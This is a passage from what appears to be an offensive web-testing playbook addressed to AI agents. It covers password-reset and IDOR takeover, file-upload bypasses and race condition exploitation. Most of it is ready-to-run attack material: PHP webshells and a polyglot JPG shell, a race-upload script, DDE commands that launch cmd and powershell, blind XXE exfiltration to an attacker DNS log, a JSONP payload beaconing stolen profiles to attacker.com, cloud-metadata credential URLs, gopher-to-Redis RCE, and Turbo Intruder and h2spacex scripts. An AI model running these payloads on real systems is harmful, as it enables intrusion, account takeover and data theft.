6. MULTI-INTERFACE: same SMS service exposed at /api/sendCode AND /api/v2/sendCode,
   counter not shared.
```

**Defense**: trim+normalize the phone field server-side before any rate-limiting decision. Apply rate limit at "normalized phone" + "IP" + "deviceId".

### 12.3 Captcha Echoed in Response

```http
GET /tcode.html?phoneNumber=18888888887
HTTP/1.1 200 OK
{"msg": "操作成功", "randm": 9759, "code": 0}
                    ^^^^^^
                    actual SMS code
```
Audit move: `grep '"randm"\|"verify_code"\|"captcha"\|"sms_code"' all-responses.log` — if any user-issued code shows up in JSON, it's instantly P0.

### 12.4 Frontend Form Bypass — Direct Backend Call

```text
Front-end has:    image_captcha + sms_code + phone + password
                  client-side JS rejects empty fields
Backend handler:  /api/register  validates only sms_code+phone

Bypass: directly call /api/register without image_captcha — server accepts.
       (some systems even accept missing sms_code if the parameter key is absent.)
```

### 12.5 Password Field XSS (Stored)

Registration nickname / bio / signature commonly accepts:
```html
<img src=x onerror=alert(document.cookie)>
```
Render context matters — verify it triggers in profile page / comment area / admin user-list (admin XSS = full takeover).

---

## 13. Password Recovery Real-World Cases / 找回密码实战场景

### 13.1 `auth = md5(rand())` on Windows PHP — Full Enumeration

```php
// Vulnerable token generator on Windows PHP:
$auth = md5(rand());          // RAND_MAX = 32768 on Windows builds
$link = "/resetpassword.php?id=$auth";
mail($user, "click: $link");
```

Attacker dictionary:
```php
<?php
$dict = [];
for ($i = 0; $i <= 32768; $i++) {
    $dict[] = md5($i);
}
file_put_contents('auth_dict.txt', implode("\n", $dict));
```

Burp Intruder over `/resetpassword.php?id=§MD5§` with the dictionary — successful tokens redirect to a "set new password" page. From there, set the password for whichever user the token unlocks.

**Variants**:
- `mt_rand()` without `mt_srand()` on PHP < 7.1 — predictable seed
- `Math.random()` in Node.js — Xorshift128+, can be reversed from ~5 outputs (use `v8-randomness-predictor`)
- C# `new Random()` default seed = `Environment.TickCount` — narrow range

### 13.2 Session-Replacement Reset Attack

```text
1. Attacker: request password reset for ATTACKER@example.com → receive email with valid token
2. Attacker: open the email link → reach "enter new password" page (server tracks "in-progress reset" in session)
3. Burp intercept the final POST:
     POST /reset/setpwd
     {"email": "ATTACKER@example.com", "newPwd": "P@ssw0rd!"}
   → Modify to:
     {"email": "VICTIM@example.com",   "newPwd": "P@ssw0rd!"}
4. Server checks "is there an in-progress reset in session?" → YES → applies new password to
   whatever email is in the body → victim's password is now P@ssw0rd!
```

**Root cause**: server stores "reset in progress" in the session but does NOT bind it to the originally-validated email. Defense: tie the session entry to the specific user/email; fail closed if the body's email doesn't match.

### 13.3 Reset Code Replacement in Verification Step

```text
Step 1: Enter username:    "victim"           → server says "code sent to victim's phone"
Step 2: Enter code:         "111111" (wrong)  → server returns failure
Step 3: Burp intercepts the failure response  → modify to:
        {"success": true, "step": 3}
Step 4: Front-end sees success → moves to "set new password" page
Step 5: Submit new password → server (without re-validating step 2) accepts → victim's password reset
```

This is the same response-tampering pattern as §11.5; just applied to recovery flow.

### 13.4 Reset Token NOT Bound to Account

```text
1. Account A (yours): request reset → receive token T_A
2. Account B (victim): request reset → receive token T_B (you don't see this; victim does)
3. Use TOKEN T_A but in URL/body specify VICTIM:
     /reset/confirm?token=T_A&user=victim
4. Server: "T_A is valid, confirm reset for whoever the body says" → resets victim
```

Defense: at token issuance, persist `(token, user_id, expiry, used_flag)` and validate every step that the token's bound `user_id` matches the request's `user_id`.

### 13.5 Email-Change → Reset-Token Replay

```text
1. Have account A (your own) → request reset → token T issued via email
2. Login normally → change email from A@... to A2@...
3. Token T was bound to email A@..., now use it:
     POST /reset/confirm  {"token": "T", "newPwd": "..."}
   If server bound token to email-string but doesn't enforce "current user's current email"
   → replay still works, hijacks the account.
```

Defense: bind reset tokens to immutable user_id, not email-string.

### 13.6 Email Verification Bypass via Registration

```text
Register account with VICTIM@example.com (unverified):
  → If the system creates the account immediately and "merges" with future verified attempts,
    the attacker can pre-register every interesting username/email and wait.
  → If victim later signs up with the same email, server may treat as "repeat registration"
    and forward auth state to the existing record → attacker takeover.
```

### 13.7 Mobile-Scenario Redirect Hijack

```text
After password reset, server redirects:
  GET /reset/done?next=/login

Bypass:
  GET /reset/done?next=https://attacker.com/login   ← if server doesn't validate next= → SSRF/phish
  GET /reset/done?next=//attacker.com               ← protocol-relative
  GET /reset/done?next=/login@attacker.com          ← user-info trick
  GET /reset/done?next=javascript:alert(1)          ← XSS if rendered in <a href>
```

(Full URL-redirect bypass list in [CHECKLIST.md §11](./CHECKLIST.md).)

---

## 14. IDOR / Authorization — Reproducible Drills

> Companion to [SKILL.md §11.6](./SKILL.md) and [CHECKLIST.md §8](./CHECKLIST.md).
> Each drill below is a 30-second reproduction window: capture once, swap one
> field, replay. The point is to make the test **boring enough to run on every endpoint**.

### 14.1 Horizontal IDOR — One-Field-Swap Drill

```bash
SESSION_A="<your own cookie>"
A_RESOURCE_ID=10001         # your own order/profile id
B_RESOURCE_ID=10002         # neighboring id, may be victim

curl -s -H "Cookie: $SESSION_A" \
     "https://target/api/orders/$A_RESOURCE_ID" -o /tmp/a.json

curl -s -H "Cookie: $SESSION_A" \
     "https://target/api/orders/$B_RESOURCE_ID" -o /tmp/b.json

diff /tmp/a.json /tmp/b.json
```

If `b.json` returns a real order belonging to user B (different name / phone /
amount), it's IDOR. Run with `seq 10000 10100` for an enumeration sweep — but
**stop at the first three confirmed hits and report**, do not exfiltrate volume.

### 14.2 Vertical IDOR — Role / is_admin Switch in Body

```http
POST /api/user/profile/update HTTP/1.1
Host: target.com
Cookie: session=NORMAL_USER
Content-Type: application/json

{
  "uid": 10001,
  "nickname": "test",
  "role": "admin",         ← inject role
  "is_admin": true,        ← alternate field name
  "level": 99,             ← privilege-tier int
  "department_id": 1       ← sometimes "1" = root org
}
```

Replay and immediately call an admin-only endpoint
(`/api/admin/users` etc.) with the same cookie. If the admin endpoint now
returns 200 with sensitive data, the role field in the body or the resulting
session cache was trusted server-side.

### 14.3 UID-vs-Token Mismatch — The Boring But Devastating Test

```python
import requests

S_A = requests.Session()
S_A.cookies.set("token", "TOKEN_A_VALID")

for victim_uid in range(10000, 10010):
    r = S_A.get(f"https://target/api/account/info",
                params={"uid": victim_uid})
    print(victim_uid, r.status_code, r.text[:200])
```

Token is A's, `uid` is B's. If response varies by `uid` (i.e. server uses the
body's `uid` instead of the token's identity), it's classic horizontal IDOR.
This pattern is the single most common high-severity IDOR finding in
e-commerce / fintech APIs.

### 14.4 Email / Phone Re-bind Without Old-Verifier

```http
POST /api/user/bind/email HTTP/1.1
Cookie: session=VICTIM_SESSION
Content-Type: application/json

{
  "new_email": "attacker@evil.com",
  "verify_code": "ANY"        ← drop / leave fixed
}
```

Three classes of bug to confirm in one shot:
1. Endpoint accepts new email without **old email confirmation** → takeover.
2. Endpoint accepts any `verify_code` → broken validation.
3. Endpoint accepts request without any code field → no enforcement.

If any of the three pass, treat as account takeover.

### 14.5 Multi-Channel Inconsistency Sweep

```bash
# Same logical action, different surfaces:
curl -X POST https://web.target.com/api/v1/order/cancel/123 ...
curl -X POST https://m.target.com/h5/order/cancel \
     -d "id=123" ...
curl -X POST https://api.target.com/mobile/order/cancel \
     -H "User-Agent: TargetApp/3.5.0 (Android)" \
     -d "id=123" ...
curl -X POST https://target.com/admin/order/cancel \
     -d "order_id=123" ...
```

Web blocks, mobile open. App blocks, internal API open. **Production reality**:
these four endpoints are written by four different teams over four years and
will not have aligned auth. Always test all four.

---

## 15. File Upload — Payload Library and Reproduction Windows

> Companion to [SKILL.md §11.8](./SKILL.md) and [CHECKLIST.md §16](./CHECKLIST.md).

### 15.1 Extension Bypass Lab

For each upload point, run **all eight** below before declaring it safe.
The list is ordered from "lazy filter" to "thorough filter":

```text
shell.php                    ← naive blacklist absent
shell.php5 / .phtml / .pht   ← rare extensions still served by Apache
shell.PhP / .pHP             ← case-mix
shell.php.jpg                ← double-ext, server picks first
shell.php;.jpg               ← Apache ;-split
shell.php%00.jpg             ← null byte (still alive on legacy stacks)
shell.php.                   ← trailing dot (Windows IIS)
shell.php/                   ← trailing slash (some routes)
```

Companion JSP / ASP / WAR variants:

```text
shell.jsp / .jspx / .jsw / .jsv / .jspf
shell.aspx / .asp / .asa / .cer / .cdx / .htr
exploit.war (deploy via Tomcat manager)
```

### 15.2 Polyglot Upload — Image That Is Also a Shell

```bash
# JPG header + PHP shell appended:
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' \
  > poly.jpg
echo '<?php @eval($_REQUEST[0]); ?>' >> poly.jpg

# Upload as shell.jpg via legitimate avatar endpoint
# Then trigger via include / interpreter:
#  - Apache misconfig: AddHandler application/x-httpd-php .jpg
#  - Or LFI: ?file=/uploads/123/shell.jpg
```

Verify the file is still recognized as a JPG by `file poly.jpg` (so MIME-sniff
based filters pass).

### 15.3 Office (docx/xlsx) Repack with XXE / DDE

```bash
mkdir doc-payload && cd doc-payload
unzip ../template.docx
# Inject XXE in word/document.xml:
sed -i 's#<w:body>#<w:body><!DOCTYPE foo [<!ENTITY x SYSTEM "http://evil/dtd">]>\&x;#' \
    word/document.xml
zip -r ../malicious.docx .
cd ..

# Upload malicious.docx to whatever consumes Office attachments
```

DDE variant (executes on Excel open with default settings on legacy Office):

```text
=cmd|'/c calc.exe'!A1
=cmd|'/c powershell -nop -w hidden -c "..."'!A1
```

### 15.4 Filename Path Traversal — Storage Pwn

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---x

---x
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>
---x--
```

If the server uses the multipart filename verbatim in `os.path.join(base, filename)`
without sanitization, the file lands at the traversed path. Confirm by hitting
`https://target/shell.php?c=id`.

### 15.5 Race-Window Exploit — File Available Before AV Cleanup

```python
import requests, threading, time

UPLOAD = "https://target/api/upload"
ACCESS = "https://target/uploads/{}/shell.php"

def upload(i):
    files = {"file": ("shell.php", "<?php system($_GET[0]); ?>", "image/jpeg")}
    r = requests.post(UPLOAD, files=files, cookies={"session": "..."})
    return r.json().get("path")

def hammer_access(path):
    deadline = time.time() + 10
    while time.time() < deadline:
        r = requests.get(ACCESS.format(path), params={"0": "id"})
        if "uid=" in r.text:
            print("HIT", path); break

paths = [upload(i) for i in range(20)]
for p in paths:
    threading.Thread(target=hammer_access, args=(p,)).start()
```

If the server has an AV/scan job that deletes WebShells but the file is
served between upload and scan, this 10-second window is your hit zone.

### 15.6 ZIP Bomb (Defense Verification, Use With Care)

```bash
# 42.zip (10MB on disk → 4.5PB decompressed):
# Get a public sample and upload to a "decompress on import" endpoint
curl -O https://www.bamsoftware.com/hacks/zipbomb/42.zip
# If the server CPU spikes / OOMs after import, decompression is unbounded.
```

Defense check: server must enforce single-file-decompressed-size + total-decompressed-size.

### 15.7 CSV / XLSX Formula Injection

Construct a CSV your service generates as an export OR feeds into Excel:

```csv
name,email
=cmd|'/c calc'!A1,attacker@example.com
=HYPERLINK("http://evil/?u="&A2&A3,"click here"),admin@target.com
@SUM(1+1)*cmd|'/c calc'!A1,test@example.com
+1+cmd|'/c calc'!A1,test2@example.com
-1+cmd|'/c calc'!A1,test3@example.com
```

Defense: prefix every field that starts with `=`, `+`, `-`, `@` with a single
quote, or use a dedicated CSV writer with `quoting=csv.QUOTE_ALL`.

---

## 16. SSRF / XXE / Out-of-Band — Field-Ready Payloads

> Companion to [SKILL.md §11.9](./SKILL.md) and [CHECKLIST.md §17](./CHECKLIST.md).

### 16.1 OOB Setup — One-Line Listeners

```bash
# DNSLog: register a domain at https://dnslog.cn or http://www.dnslog.cn
# Each request to <random>.<your>.dnslog.cn is logged.

# Burp Collaborator: in Burp Pro, Burp menu → Collaborator client → "Copy to clipboard"

# Self-hosted catch-all over HTTP:
python3 -m http.server 8080      # stdout shows requests
# or with logging body content:
ncat -lv -p 8080 -k -c 'cat'
```

Use the resulting domain (e.g. `xy12.YOUR.dnslog.cn`) in every payload below.

### 16.2 XXE — Direct Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root><name>&x;</name></root>
```

Send as `Content-Type: application/xml` to any XML-consuming endpoint
(SOAP, OPDS, RSS, OOXML upload, SVG processor).

### 16.3 XXE — Blind, OOB Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd  SYSTEM "http://YOUR.dnslog.cn/x.dtd">
  %dtd;
  %send;
]>
<root></root>
```

Host on YOUR server `x.dtd`:

```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://YOUR.dnslog.cn/?d=%file;'>">
%all;
```

Watch DNSLog: each request includes the file content as URL-encoded subdomain
or query parameter. (URL-encoding fails on long files; use parameter
entity tricks documented at PortSwigger Web Security Academy for full read.)

### 16.4 SSRF — Cloud Metadata Sweep

```text
http://169.254.169.254/latest/meta-data/                  # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://metadata.google.internal/computeMetadata/v1/    + Header: Metadata-Flavor: Google
http://100.100.100.200/latest/meta-data/                  # Aliyun
http://169.254.169.254/metadata/instance?api-version=2021-02-01  + Header: Metadata: true (Azure)
```

If the SSRF gives back any of these → **immediate report**: cloud creds leak
is the highest-impact SSRF class.

### 16.5 SSRF — Internal Asset Discovery

```text
http://127.0.0.1:6379/                  # Redis
http://127.0.0.1:11211/stats            # Memcached (try gopher)
http://127.0.0.1:8500/v1/agent/self     # Consul
http://127.0.0.1:2379/v2/keys           # etcd
http://127.0.0.1:9200/_cat/indices?v    # Elasticsearch
http://127.0.0.1:5432/                  # PostgreSQL (banner)
http://10.0.0.0/8 ranges                # Internal APIs
```

`gopher://` payload to write to internal Redis (RCE via writing crontab):

```text
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$ ...
```

Generate with `gopherus` (https://github.com/tarunkant/Gopherus).

### 16.6 SSRF — DNS Rebinding Bypass

If the server resolves the URL once and then validates the resolved IP, but
fetches it later separately, point your domain at a TTL=0 record that flips
between `1.2.3.4` (passes validation) and `127.0.0.1` (the attack target).

Tools:
- `python3 -m http.server` with `socat`-based DNS server
- `https://lock.cmpxchg8b.com/rebinder.html` (online generator)
- `whonow`: https://github.com/brannondorsey/whonow

### 16.7 CSRF — Auto-Submitting Form Template

```html
<!DOCTYPE html>
<html><body>
<form id=f action="https://target/api/withdraw" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="amount" value="999999">
  <input name="to_account" value="attacker_account">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
```

If the victim is logged-in to `target` and visits this page (`<iframe>` or via
phishing), the request fires with their cookies. Defense: SameSite=Lax/Strict
cookie + Anti-CSRF token + Origin/Referer check.

### 16.8 JSONP-as-Read-Primitive

```html
<script src="https://target.com/api/user/profile?callback=stealUserProfile"></script>
<script>
function stealUserProfile(data) {
  navigator.sendBeacon("https://attacker.com/log", JSON.stringify(data));
}
</script>
```

If the JSONP endpoint returns sensitive user data and accepts arbitrary
callback names without origin validation, every user visiting attacker.com
leaks their profile. Defense: do not return sensitive data via JSONP; if
required, restrict callback function names to a whitelist and require
Origin / Referer.

---

## 17. Reproduction Windows — When Each Class of Bug Is Reachable

| Bug class | Best window to test | Why |
|-----------|---------------------|-----|
| Race conditions on payment / coupon | 03:00–05:00 local time | Lower legitimate traffic, RDS/Redis less contended, race window widens |
| Integer overflow on price × qty | After deploy (release notes available) | New SKUs / new flows often miss the upper-bound guard |
| Verification-code rate limit | Any time, but bursts ≤ 30s | Most rate limiters use sliding windows of 60s; 30s bursts pass |
| Brand-new IDOR | First 24h after a feature ships | Org-level RBAC seldom audits new endpoints in time |
| File-upload race | Right after off-peak AV-scan window | Scanner loaded, not running, files sit longer |
| SSRF on cloud assets | Any time | Metadata endpoints don't sleep |

When a target has change-control windows (banks, telcos), capture `Last-Modified`
on JS bundles and re-test 48h after every push.


---
# Part 5: Race Conditions


# SKILL: Race Conditions — Testing & Exploitation Playbook

> **AI LOAD INSTRUCTION**: Treat race conditions as **authorization/state integrity** issues: non-atomic read-then-write lets multiple requests observe stale state. Prioritize **one-time** or **balance-like** operations. Combine **parallel transport** (HTTP/1.1 last-byte sync, HTTP/2 single-packet, Turbo Intruder gates) with **application evidence** (duplicate success responses, inconsistent balances, duplicate ledger rows). **Authorized testing only.** Routing note: for business workflows, coupons, inventory, or one-time rewards, start with this skill and cross-load `business-logic-vulnerabilities`.


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `skills/business-logic-vulnerabilities/SKILL.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

